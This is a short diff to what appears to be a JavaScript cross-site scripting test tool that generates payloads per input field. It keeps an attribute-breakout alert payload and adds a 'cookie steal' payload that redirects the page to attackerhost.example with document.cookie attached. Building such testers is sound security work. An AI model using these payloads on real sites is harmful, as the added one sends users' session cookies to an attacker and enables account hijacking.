@@ -63,4 +63,9 @@ $(document).ready(function() {
   attacks[2][2] = function(name) {
     return "\"><script>alert('"+name+" is vulnerable to an attribute attack.');</script>";
   }
+
+  /* Redirect cookie steal */
+  attacks[2][3] = function(name) {
+    return "<script>document.location='http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>";
+  }
 });
